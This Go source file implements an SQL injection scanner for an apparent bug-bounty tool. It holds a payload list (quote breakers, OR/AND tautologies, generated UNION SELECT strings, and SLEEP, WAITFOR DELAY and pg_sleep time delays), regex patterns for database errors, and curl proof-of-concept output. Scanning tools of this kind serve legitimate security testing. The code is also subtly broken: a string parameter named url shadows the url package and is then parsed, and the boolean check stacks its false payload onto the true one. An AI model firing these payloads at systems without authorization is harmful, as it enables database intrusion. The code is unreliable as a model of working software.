package vuln

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/bugbounty-tool/internal/config"
	"github.com/bugbounty-tool/internal/logger"
	"github.com/bugbounty-tool/pkg/models"
	"github.com/bugbounty-tool/pkg/utils"
)

// SQLiScanner detects SQL injection vulnerabilities
type SQLiScanner struct {
	config   *config.Config
	log      logger.Logger
	client   *http.Client
	payloads []SQLiPayload
}

type SQLiPayload struct {
	Payload     string
	Type        string // union, boolean, time, error
	DBMS        string // mysql, postgresql, mssql, oracle, etc.
	Context     string // numeric, string, etc.
	Description string
	TimeDelay   int // for time-based payloads
}

type SQLiEvidence struct {
	ErrorMessages []string
	TimingDiff    float64
	UnionColumns  int
	BooleanDiff   bool
	DataExposed   bool
}

// NewSQLiScanner creates a new SQL injection vulnerability scanner
func NewSQLiScanner(cfg *config.Config, log logger.Logger) *SQLiScanner {
	return &SQLiScanner{
		config:   cfg,
		log:      log,
		client:   utils.NewHTTPClient(cfg),
		payloads: loadSQLiPayloads(),
	}
}

// ScanForSQLi performs comprehensive SQL injection vulnerability scanning
func (ss *SQLiScanner) ScanForSQLi(ctx context.Context, target *models.Target, config *models.ScanConfig) ([]*models.Vulnerability, error) {
	ss.log.Info("Starting SQL injection vulnerability scan", "target", target.URL)
	
	vulnerabilities := make([]*models.Vulnerability, 0)
	
	// Test different injection types
	injectionTypes := []string{"error", "boolean", "union", "time"}
	
	for _, injType := range injectionTypes {
		switch injType {
		case "error":
			vulns, err := ss.scanErrorBasedSQLi(ctx, target, config)
			if err != nil {
				ss.log.Error("Error-based SQLi scan failed", "error", err)
				continue
			}
			vulnerabilities = append(vulnerabilities, vulns...)
			
		case "boolean":
			vulns, err := ss.scanBooleanBasedSQLi(ctx, target, config)
			if err != nil {
				ss.log.Error("Boolean-based SQLi scan failed", "error", err)
				continue
			}
			vulnerabilities = append(vulnerabilities, vulns...)
			
		case "union":
			vulns, err := ss.scanUnionBasedSQLi(ctx, target, config)
			if err != nil {
				ss.log.Error("Union-based SQLi scan failed", "error", err)
				continue
			}
			vulnerabilities = append(vulnerabilities, vulns...)
			
		case "time":
			vulns, err := ss.scanTimeBasedSQLi(ctx, target, config)
			if err != nil {
				ss.log.Error("Time-based SQLi scan failed", "error", err)
				continue
			}
			vulnerabilities = append(vulnerabilities, vulns...)
		}
	}
	
	ss.log.Info("SQL injection scan completed",
		"target", target.URL,
		"vulnerabilities_found", len(vulnerabilities))
	
	return vulnerabilities, nil
}

func (ss *SQLiScanner) scanErrorBasedSQLi(ctx context.Context, target *models.Target, config *models.ScanConfig) ([]*models.Vulnerability, error) {
	vulnerabilities := make([]*models.Vulnerability, 0)
	
	// Get baseline response first
	baseline, err := ss.makeRequest(ctx, target.URL, "", "", config)
	if err != nil {
		return nil, err
	}
	
	// Test parameters
	if len(target.Parameters) > 0 {
		vulns, err := ss.testErrorSQLiInParameters(ctx, target, baseline, config)
		if err != nil {
			return nil, err
		}
		vulnerabilities = append(vulnerabilities, vulns...)
	}
	
	// Test forms
	if len(target.Forms) > 0 {
		vulns, err := ss.testErrorSQLiInForms(ctx, target, baseline, config)
		if err != nil {
			return nil, err
		}
		vulnerabilities = append(vulnerabilities, vulns...)
	}
	
	return vulnerabilities, nil
}

func (ss *SQLiScanner) testErrorSQLiInParameters(ctx context.Context, target *models.Target, baseline *http.Response, config *models.ScanConfig) ([]*models.Vulnerability, error) {
	vulnerabilities := make([]*models.Vulnerability, 0)
	
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil, err
	}
	
	originalParams := parsedURL.Query()
	
	// Test each parameter
	for paramName := range originalParams {
		for _, payload := range ss.payloads {
			if payload.Type != "error" {
				continue
			}
			
			// Create test URL with payload
			testParams := make(url.Values)
			for k, v := range originalParams {
				testParams[k] = v
			}
			testParams.Set(paramName, payload.Payload)
			
			parsedURL.RawQuery = testParams.Encode()
			testURL := parsedURL.String()
			
			// Make request
			resp, err := ss.makeRequest(ctx, testURL, "", "", config)
			if err != nil {
				continue
			}
			
			// Read response body
			body := make([]byte, ss.config.Scanning.MaxBodySize)
			n, _ := resp.Body.Read(body)
			resp.Body.Close()
			responseBody := string(body[:n])
			
			// Check for SQL error messages
			evidence := ss.detectSQLErrors(responseBody, resp)
			if len(evidence.ErrorMessages) > 0 {
				vuln := &models.Vulnerability{
					ID:          fmt.Sprintf("sqli-error-%s-%d", paramName, time.Now().Unix()),
					Type:        "SQL Injection (Error-based)",
					Severity:    "High",
					Title:       fmt.Sprintf("Error-based SQL injection in parameter '%s'", paramName),
					Description: fmt.Sprintf("The parameter '%s' is vulnerable to error-based SQL injection. Database error messages are exposed in the response.", paramName),
					URL:         testURL,
					Parameter:   paramName,
					Payload:     payload.Payload,
					Method:      "GET",
					Evidence:    strings.Join(evidence.ErrorMessages, "; "),
					Impact:      "An attacker can extract sensitive data from the database, modify data, or potentially execute system commands.",
					Remediation: "Use parameterized queries/prepared statements. Implement proper input validation and error handling.",
					References: []string{
						"https://owasp.org/www-community/attacks/SQL_Injection",
						"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
					},
					Risk:        "High",
					Confidence:  95,
					Timestamp:   time.Now(),
				}
				
				// Add detailed DBMS information if detected
				dbms := ss.detectDBMS(evidence.ErrorMessages)
				if dbms != "" {
					vuln.Description += fmt.Sprintf(" Database type detected: %s", dbms)
				}
				
				vuln.ProofOfConcept = ss.generateSQLiPoC(testURL, paramName, payload.Payload, "GET")
				vulnerabilities = append(vulnerabilities, vuln)
				
				ss.log.Info("Error-based SQL injection found",
					"url", testURL,
					"parameter", paramName,
					"dbms", dbms)
				
				break // Found vulnerability, move to next parameter
			}
		}
	}
	
	return vulnerabilities, nil
}

func (ss *SQLiScanner) testErrorSQLiInForms(ctx context.Context, target *models.Target, baseline *http.Response, config *models.ScanConfig) ([]*models.Vulnerability, error) {
	vulnerabilities := make([]*models.Vulnerability, 0)
	
	for _, form := range target.Forms {
		for _, input := range form.Inputs {
			if input.Type == "submit" || input.Type == "button" || input.Type == "hidden" {
				continue
			}
			
			for _, payload := range ss.payloads {
				if payload.Type != "error" {
					continue
				}
				
				// Build form data
				formData := url.Values{}
				for _, formInput := range form.Inputs {
					if formInput.Name == input.Name {
						formData.Set(formInput.Name, payload.Payload)
					} else if formInput.Value != "" {
						formData.Set(formInput.Name, formInput.Value)
					} else {
						formData.Set(formInput.Name, "test")
					}
				}
				
				// Determine form action URL
				actionURL := form.Action
				if actionURL == "" {
					actionURL = target.URL
				}
				
				// Make request
				resp, err := ss.makeFormRequest(ctx, actionURL, form.Method, formData, config)
				if err != nil {
					continue
				}
				
				// Read response
				body := make([]byte, ss.config.Scanning.MaxBodySize)
				n, _ := resp.Body.Read(body)
				resp.Body.Close()
				responseBody := string(body[:n])
				
				// Check for SQL errors
				evidence := ss.detectSQLErrors(responseBody, resp)
				if len(evidence.ErrorMessages) > 0 {
					vuln := &models.Vulnerability{
						ID:          fmt.Sprintf("sqli-form-error-%s-%d", input.Name, time.Now().Unix()),
						Type:        "SQL Injection (Error-based)",
						Severity:    "High",
						Title:       fmt.Sprintf("Error-based SQL injection in form input '%s'", input.Name),
						Description: fmt.Sprintf("The form input '%s' is vulnerable to error-based SQL injection.", input.Name),
						URL:         actionURL,
						Parameter:   input.Name,
						Payload:     payload.Payload,
						Method:      form.Method,
						Evidence:    strings.Join(evidence.ErrorMessages, "; "),
						Impact:      "An attacker can extract sensitive data from the database.",
						Remediation: "Use parameterized queries for form processing.",
						Risk:        "High",
						Confidence:  95,
						Timestamp:   time.Now(),
					}
					
					vulnerabilities = append(vulnerabilities, vuln)
					break
				}
			}
		}
	}
	
	return vulnerabilities, nil
}

func (ss *SQLiScanner) scanBooleanBasedSQLi(ctx context.Context, target *models.Target, config *models.ScanConfig) ([]*models.Vulnerability, error) {
	vulnerabilities := make([]*models.Vulnerability, 0)
	
	// Get baseline response
	baseline, err := ss.getBaselineResponse(ctx, target.URL, config)
	if err != nil {
		return nil, err
	}
	
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil, err
	}
	
	originalParams := parsedURL.Query()
	
	for paramName := range originalParams {
		// Test boolean-based payloads
		truePayload := "1' OR '1'='1"
		falsePayload := "1' AND '1'='2"
		
		// Test true condition
		testParams := make(url.Values)
		for k, v := range originalParams {
			testParams[k] = v
		}
		testParams.Set(paramName, testParams.Get(paramName)+truePayload)
		
		parsedURL.RawQuery = testParams.Encode()
		trueURL := parsedURL.String()
		
		trueResp, err := ss.makeRequest(ctx, trueURL, "", "", config)
		if err != nil {
			continue
		}
		
		trueBody := make([]byte, ss.config.Scanning.MaxBodySize)
		n, _ := trueResp.Body.Read(trueBody)
		trueResp.Body.Close()
		trueContent := string(trueBody[:n])
		
		// Test false condition
		testParams.Set(paramName, testParams.Get(paramName)+falsePayload)
		parsedURL.RawQuery = testParams.Encode()
		falseURL := parsedURL.String()
		
		falseResp, err := ss.makeRequest(ctx, falseURL, "", "", config)
		if err != nil {
			continue
		}
		
		falseBody := make([]byte, ss.config.Scanning.MaxBodySize)
		n, _ = falseResp.Body.Read(falseBody)
		falseResp.Body.Close()
		falseContent := string(falseBody[:n])
		
		// Compare responses
		if ss.responsesDiffer(trueContent, falseContent, baseline) {
			vuln := &models.Vulnerability{
				ID:          fmt.Sprintf("sqli-boolean-%s-%d", paramName, time.Now().Unix()),
				Type:        "SQL Injection (Boolean-based)",
				Severity:    "High",
				Title:       fmt.Sprintf("Boolean-based SQL injection in parameter '%s'", paramName),
				Description: fmt.Sprintf("The parameter '%s' is vulnerable to boolean-based blind SQL injection.", paramName),
				URL:         target.URL,
				Parameter:   paramName,
				Payload:     truePayload,
				Method:      "GET",
				Evidence:    "Different responses for true and false conditions indicate boolean-based SQL injection",
				Impact:      "An attacker can extract data from the database through boolean-based blind techniques.",
				Remediation: "Use parameterized queries to prevent SQL injection.",
				Risk:        "High",
				Confidence:  80,
				Timestamp:   time.Now(),
			}
			
			vulnerabilities = append(vulnerabilities, vuln)
		}
	}
	
	return vulnerabilities, nil
}

func (ss *SQLiScanner) scanUnionBasedSQLi(ctx context.Context, target *models.Target, config *models.ScanConfig) ([]*models.Vulnerability, error) {
	vulnerabilities := make([]*models.Vulnerability, 0)
	
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil, err
	}
	
	originalParams := parsedURL.Query()
	
	for paramName := range originalParams {
		// Test different numbers of columns for UNION injection
		for columns := 1; columns <= 10; columns++ {
			unionPayload := ss.buildUnionPayload(columns)
			
			testParams := make(url.Values)
			for k, v := range originalParams {
				testParams[k] = v
			}
			testParams.Set(paramName, unionPayload)
			
			parsedURL.RawQuery = testParams.Encode()
			testURL := parsedURL.String()
			
			resp, err := ss.makeRequest(ctx, testURL, "", "", config)
			if err != nil {
				continue
			}
			
			body := make([]byte, ss.config.Scanning.MaxBodySize)
			n, _ := resp.Body.Read(body)
			resp.Body.Close()
			responseBody := string(body[:n])
			
			// Check for union injection success indicators
			if ss.detectUnionSuccess(responseBody, columns) {
				vuln := &models.Vulnerability{
					ID:          fmt.Sprintf("sqli-union-%s-%d", paramName, time.Now().Unix()),
					Type:        "SQL Injection (Union-based)",
					Severity:    "Critical",
					Title:       fmt.Sprintf("Union-based SQL injection in parameter '%s'", paramName),
					Description: fmt.Sprintf("The parameter '%s' is vulnerable to union-based SQL injection with %d columns.", paramName, columns),
					URL:         testURL,
					Parameter:   paramName,
					Payload:     unionPayload,
					Method:      "GET",
					Evidence:    fmt.Sprintf("UNION SELECT with %d columns successful", columns),
					Impact:      "An attacker can extract any data from the database using UNION queries.",
					Remediation: "Use parameterized queries and validate input data types.",
					Risk:        "Critical",
					Confidence:  90,
					Timestamp:   time.Now(),
				}
				
				vulnerabilities = append(vulnerabilities, vuln)
				break // Found working column count
			}
		}
	}
	
	return vulnerabilities, nil
}

func (ss *SQLiScanner) scanTimeBasedSQLi(ctx context.Context, target *models.Target, config *models.ScanConfig) ([]*models.Vulnerability, error) {
	vulnerabilities := make([]*models.Vulnerability, 0)
	
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil, err
	}
	
	originalParams := parsedURL.Query()
	
	for paramName := range originalParams {
		// Get baseline response time
		baselineStart := time.Now()
		baselineResp, err := ss.makeRequest(ctx, target.URL, "", "", config)
		if err != nil {
			continue
		}
		baselineResp.Body.Close()
		baselineTime := time.Since(baselineStart).Seconds()
		
		// Test time-based payloads
		for _, payload := range ss.payloads {
			if payload.Type != "time" {
				continue
			}
			
			testParams := make(url.Values)
			for k, v := range originalParams {
				testParams[k] = v
			}
			testParams.Set(paramName, testParams.Get(paramName)+payload.Payload)
			
			parsedURL.RawQuery = testParams.Encode()
			testURL := parsedURL.String()
			
			// Make request and measure time
			start := time.Now()
			resp, err := ss.makeRequest(ctx, testURL, "", "", config)
			if err != nil {
				continue
			}
			resp.Body.Close()
			responseTime := time.Since(start).Seconds()
			
			// Check if response time is significantly longer
			if responseTime > baselineTime+float64(payload.TimeDelay)-1 {
				vuln := &models.Vulnerability{
					ID:          fmt.Sprintf("sqli-time-%s-%d", paramName, time.Now().Unix()),
					Type:        "SQL Injection (Time-based)",
					Severity:    "High",
					Title:       fmt.Sprintf("Time-based SQL injection in parameter '%s'", paramName),
					Description: fmt.Sprintf("The parameter '%s' is vulnerable to time-based blind SQL injection.", paramName),
					URL:         testURL,
					Parameter:   paramName,
					Payload:     payload.Payload,
					Method:      "GET",
					Evidence:    fmt.Sprintf("Response time: %.2fs (baseline: %.2fs, expected delay: %ds)", responseTime, baselineTime, payload.TimeDelay),
					Impact:      "An attacker can extract data from the database using time-based blind techniques.",
					Remediation: "Use parameterized queries to prevent SQL injection.",
					Risk:        "High",
					Confidence:  85,
					Timestamp:   time.Now(),
				}
				
				vulnerabilities = append(vulnerabilities, vuln)
				break
			}
		}
	}
	
	return vulnerabilities, nil
}

func (ss *SQLiScanner) makeRequest(ctx context.Context, url, method, body string, config *models.ScanConfig) (*http.Response, error) {
	if method == "" {
		method = "GET"
	}
	
	var req *http.Request
	var err error
	
	if body != "" {
		req, err = http.NewRequestWithContext(ctx, method, url, strings.NewReader(body))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, err = http.NewRequestWithContext(ctx, method, url, nil)
	}
	
	if err != nil {
		return nil, err
	}
	
	req.Header.Set("User-Agent", config.UserAgent)
	if config.Headers != nil {
		for k, v := range config.Headers {
			req.Header.Set(k, v)
		}
	}
	
	return ss.client.Do(req)
}

func (ss *SQLiScanner) makeFormRequest(ctx context.Context, url, method string, formData url.Values, config *models.ScanConfig) (*http.Response, error) {
	if method == "" || strings.ToUpper(method) == "GET" {
		// GET request with parameters in URL
		parsedURL, err := url.Parse(url)
		if err != nil {
			return nil, err
		}
		parsedURL.RawQuery = formData.Encode()
		return ss.makeRequest(ctx, parsedURL.String(), "GET", "", config)
	} else {
		// POST request with form data in body
		return ss.makeRequest(ctx, url, method, formData.Encode(), config)
	}
}

func (ss *SQLiScanner) detectSQLErrors(responseBody string, resp *http.Response) *SQLiEvidence {
	evidence := &SQLiEvidence{
		ErrorMessages: make([]string, 0),
	}
	
	// Common SQL error patterns
	errorPatterns := []struct {
		pattern *regexp.Regexp
		dbms    string
	}{
		{regexp.MustCompile(`(?i)mysql_fetch_array`), "MySQL"},
		{regexp.MustCompile(`(?i)ora-\d{5}`), "Oracle"},
		{regexp.MustCompile(`(?i)postgresql.*error`), "PostgreSQL"},
		{regexp.MustCompile(`(?i)microsoft.*odbc.*driver`), "MSSQL"},
		{regexp.MustCompile(`(?i)sqlite.*error`), "SQLite"},
		{regexp.MustCompile(`(?i)syntax error.*mysql`), "MySQL"},
		{regexp.MustCompile(`(?i)invalid column name`), "MSSQL"},
		{regexp.MustCompile(`(?i)pg_query\(\)`), "PostgreSQL"},
		{regexp.MustCompile(`(?i)warning.*mysql_`), "MySQL"},
		{regexp.MustCompile(`(?i)valid mysql result`), "MySQL"},
		{regexp.MustCompile(`(?i)access violation`), "MSSQL"},
		{regexp.MustCompile(`(?i)sqlstate`), "Generic"},
	}
	
	for _, errorPattern := range errorPatterns {
		matches := errorPattern.pattern.FindAllString(responseBody, -1)
		for _, match := range matches {
			evidence.ErrorMessages = append(evidence.ErrorMessages, match)
		}
	}
	
	return evidence
}

func (ss *SQLiScanner) detectDBMS(errorMessages []string) string {
	dbmsIndicators := map[string][]string{
		"MySQL": {"mysql", "mysqld", "my.cnf"},
		"PostgreSQL": {"postgresql", "postgres", "psql"},
		"MSSQL": {"microsoft", "sqlserver", "mssql"},
		"Oracle": {"ora-", "oracle", "oci"},
		"SQLite": {"sqlite"},
	}
	
	for dbms, indicators := range dbmsIndicators {
		for _, error := range errorMessages {
			errorLower := strings.ToLower(error)
			for _, indicator := range indicators {
				if strings.Contains(errorLower, indicator) {
					return dbms
				}
			}
		}
	}
	
	return ""
}

func (ss *SQLiScanner) getBaselineResponse(ctx context.Context, url string, config *models.ScanConfig) (string, error) {
	resp, err := ss.makeRequest(ctx, url, "", "", config)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	
	body := make([]byte, ss.config.Scanning.MaxBodySize)
	n, _ := resp.Body.Read(body)
	
	return string(body[:n]), nil
}

func (ss *SQLiScanner) responsesDiffer(response1, response2, baseline string) bool {
	// Simple comparison - in production, use more sophisticated diff algorithms
	return len(response1) != len(response2) || 
		   (strings.Contains(response1, "error") != strings.Contains(response2, "error"))
}

func (ss *SQLiScanner) buildUnionPayload(columns int) string {
	selects := make([]string, columns)
	for i := 0; i < columns; i++ {
		selects[i] = fmt.Sprintf("'test%d'", i+1)
	}
	return fmt.Sprintf("' UNION SELECT %s--", strings.Join(selects, ","))
}

func (ss *SQLiScanner) detectUnionSuccess(responseBody string, columns int) bool {
	// Look for our test values in the response
	for i := 1; i <= columns; i++ {
		testValue := fmt.Sprintf("test%d", i)
		if strings.Contains(responseBody, testValue) {
			return true
		}
	}
	return false
}

func (ss *SQLiScanner) generateSQLiPoC(url, parameter, payload, method string) string {
	if method == "POST" {
		return fmt.Sprintf(`curl -X POST "%s" -d "%s=%s"`, url, parameter, url.QueryEscape(payload))
	}
	
	parsedURL, err := url.Parse(url)
	if err != nil {
		return fmt.Sprintf("%s %s", method, url)
	}
	
	params := parsedURL.Query()
	params.Set(parameter, payload)
	parsedURL.RawQuery = params.Encode()
	
	return fmt.Sprintf("GET %s", parsedURL.String())
}

func loadSQLiPayloads() []SQLiPayload {
	return []SQLiPayload{
		// Error-based payloads
		{
			Payload:     "'",
			Type:        "error",
			DBMS:        "all",
			Context:     "string",
			Description: "Single quote to trigger syntax error",
		},
		{
			Payload:     "\"",
			Type:        "error", 
			DBMS:        "all",
			Context:     "string",
			Description: "Double quote to trigger syntax error",
		},
		{
			Payload:     "')",
			Type:        "error",
			DBMS:        "all",
			Context:     "string",
			Description: "Quote with parenthesis",
		},
		{
			Payload:     "' OR 1=1--",
			Type:        "error",
			DBMS:        "all",
			Context:     "string",
			Description: "Basic OR injection with comment",
		},
		
		// Boolean-based payloads
		{
			Payload:     "' OR '1'='1",
			Type:        "boolean",
			DBMS:        "all",
			Context:     "string",
			Description: "True condition",
		},
		{
			Payload:     "' AND '1'='2",
			Type:        "boolean",
			DBMS:        "all",
			Context:     "string",
			Description: "False condition",
		},
		
		// Union-based payloads are generated dynamically
		
		// Time-based payloads
		{
			Payload:     "'; WAITFOR DELAY '00:00:05'--",
			Type:        "time",
			DBMS:        "mssql",
			Context:     "string",
			Description: "MSSQL time delay",
			TimeDelay:   5,
		},
		{
			Payload:     "' AND SLEEP(5)--",
			Type:        "time",
			DBMS:        "mysql",
			Context:     "string",
			Description: "MySQL time delay",
			TimeDelay:   5,
		},
		{
			Payload:     "'; SELECT pg_sleep(5)--",
			Type:        "time",
			DBMS:        "postgresql",
			Context:     "string",
			Description: "PostgreSQL time delay",
			TimeDelay:   5,
		},
	}
}
